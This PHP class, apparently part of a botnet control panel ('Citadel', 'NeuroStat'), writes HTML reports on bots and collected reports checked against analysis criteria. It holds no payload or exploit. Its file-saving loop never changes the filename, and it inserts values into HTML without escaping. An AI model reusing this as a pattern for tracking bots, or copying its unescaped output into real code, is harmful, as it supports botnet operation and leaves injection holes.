<?php namespace lib\fun\NeuroStat\Logger;

use Citadel\Models;
use lib\fun\NeuroStat\Criteria;

/** Analysis logger object
 */
class AnalysisLogger {
    /** The content buffer: HTML report
     * @var string
     */
    protected $content = "";

    /** DB connection
     * @var \dbPDO
     */
    protected $db;

    function __construct(\dbPDO $db){
        $this->db = $db;
    }

    function __toString(){
        return $this->content;
    }

    /** Save the collected HTML report to a file
     * @param string $path Directory to store the analysis report to
     * @param int $analysis_id Analysis id
     * @return bool Whether the save was successful
     */
    function save($path, $analysis_id){
        $date = date('Y-m-d_His');
        for ($i=1;;$i++)
            if (!file_exists($f = "$path/{$analysis_id}-{$date}.html"))
                return file_put_contents($f, $this->content);
        return false;
    }

    /** Initialize the analysis header
     * @param Models\NeurostatAnalysis $analysis
     */
    function init(Models\NeurostatAnalysis $analysis){
        $this->content .= sprintf(
            "<h1>%s: %s</h1>\n\n",
            date('d.m.Y H:i:s', time()),
            $analysis->name
        );
    }

    /** _prepare_report_tables() method result
     * @param string[] $report_tables
     * @param int[] $report_tables_min_id
     */
    function _prepare_report_tables($report_tables, $report_tables_min_id){
        $c = '';
        $c .= "<h2>Tables to be analyzed</h2>\n";
        $c .= "<table border=1 class='zebra lined analysis-log-report-tables'>\n";
        $c .= "\t<thead><th>Table</th><th>report_id</th></thead>\n";
        $c .= "\t<tbody>\n";
        foreach ($report_tables as $yymmdd => $table){
            $min_id = $report_tables_min_id[$yymmdd];
            $c .= "\t\t<tr><td>{$table}</td><td>".( $min_id? '&gt; '.$min_id : '*' )."</td>\n";
        }
        $c .= "\t</tbody>\n";
        $c .= "</table>\n";
        $this->content .= $c;
    }

    /** _prepare_bots_by_account() method result
     * @param int $analysis_id Analysis id
     * @param int $new_bots_count The number of new bots added
     * @param \dbPDO $db DB connection to get extra data
     */
    function _prepare_bots_by_account($analysis_id, $new_bots_count){
        $bots_list = $this->db->query(
            'SELECT `botId`, `report`
             FROM `neurostat_analysis_bots`
             WHERE `aid`=:aid', array(
            ':aid' => $analysis_id
        ))->fetchAll(\PDO::FETCH_KEY_PAIR);

        $c = "<h2>Bots to be analyzed: {$new_bots_count} new bots found</h2>\n";
        $c .= "<table border=1 class='zebra lined analysis-log-accounts'>\n";
        $c .= "\t<thead><th>BotId</th><th>Report</th></thead>\n";
        $c .= "\t<tbody>\n";
        foreach ($bots_list as $botId => $report)
            $c .= "\t\t<tr><td>{$botId}</td><td>".static::report_url($report)."</td>\n";
        $c .= "\t</tbody>\n";
        $c .= "</table>\n";
        $this->content .= $c;
    }

    /** _analyzeBotsTable_Bots() method start
     * @param int $bots_count The number of bots to be analyzed
     * @param Criteria\ABotCriterion[] $criteria The criteria we're going to apply
     */
    function _analyzeBotsTable_Bots_start($bots_count, $criteria){
        $criteria_count = count($criteria);

        $c = "<h2>Analyzing {$bots_count} bots against {$criteria_count} criteria</h2>\n";
        $c .= "<table border=1 class='zebra lined analysis-log-bots'>\n";
        $c .= "\t<thead><th>BotId</th>";
        foreach ($criteria as $criterion)
            $c .= '<td title="'.htmlspecialchars($criterion).'">'
                    .htmlspecialchars($criterion->c->title)
                    .'</td>';
        $c .= "</thead>\n";
        $c .= "\t<tbody>\n";
        $this->content .= $c;
    }

    /** _analyzeBotsTable_Bots() single bot results
     * @param string $botId
     * @param bool[] $criteria_matches array( cid => bool )
     */
    function _analyzeBotsTable_Bots_bot($botId, $criteria_matches){
        $c = "\t\t<tr>\n";
        $c .= "\t\t<th>{$botId}</th>\n";
        foreach ($criteria_matches as $bool)
            $c .= "\t\t<td>".($bool? '✔' : ' ')."</td>";
        $c .= "\t\t</tr>\n";
        $this->content .= $c;
    }

    /** _analyzeBotsTable_Bots() method end
     */
    function _analyzeBotsTable_Bots_finish(){
        $c = '';
        $c .= "\t</tbody>\n";
        $c .= "</table>\n";
        $this->content .= $c;
    }

    /** _analyzeBotsTable_Reports() method start
     * @param string $table
     * @param Criteria\AReportCriterion[] $criteria_condition_fields
     */
    function _analyzeBotsTable_Reports_start($table, $criteria_condition_fields){
        $criteria_count = count($criteria_condition_fields);

        $c = "<h2>Analyzing `$table` against {$criteria_count} criteria</h2>\n";
        $c .= "<table border=1 class='zebra lined analysis-log-reports'>\n";
        $c .= "\t<thead><th>Report</th>";
        foreach ($criteria_condition_fields as $field_name => $criterion)
            $c .= '<td title="'.htmlspecialchars($criterion).'">'
                .htmlspecialchars($criterion->c->title)
                .'</td>';
        $c .= "</thead>\n";
        $c .= "\t<tbody>\n";
        $this->content .= $c;
    }

    /** _analyzeBotsTable_Bots() single bot results
     * @param string $botId
     * @param Criteria\AReportCriterion[] $criteria_condition_fields
     * @param bool[] $criteria_matches array( cid => bool )
     */
    function _analyzeBotsTable_Reports_report($yymmdd, $report, $criteria_condition_fields, $criteria_matches){
        $c = "\t\t<tr>\n";
        $c .= "\t\t<th>".static::report_url("$yymmdd:{$report->id}")."</th>\n";
        foreach ($criteria_condition_fields as $field_name => $criterion){
            $precondition = $report->$field_name;
            $match = isset($criteria_matches[$criterion->c->cid])? $criteria_matches[$criterion->c->cid] : null;
            $c .= "\t\t<td>".
                ($precondition? '?' : ' '). # precondition matched: '?'
                ($match? '✔' : (is_null($match)? ' ' : '✘')). # criterion matched: '✔'
                "</td>";
        }
        $c .= "\t\t</tr>\n";
        $this->content .= $c;
    }

    /** _analyzeBotsTable_Reports() method end
     */
    function _analyzeBotsTable_Reports_finish(){
        $c = '';
        $c .= "\t</tbody>\n";
        $c .= "</table>\n";
        $this->content .= $c;
    }

    /** Convert report reference in the form of "yymmdd:id" to an HTML link
     * @param string|null $report
     * @return string
     */
    static function report_url($report){
        if (empty($report))
            return null;
        $report_url = '?m=reports_db&t='.str_replace(':', '&id=', $report);
        return "<a href='{$report_url}'>{$report}</a>";
    }
}
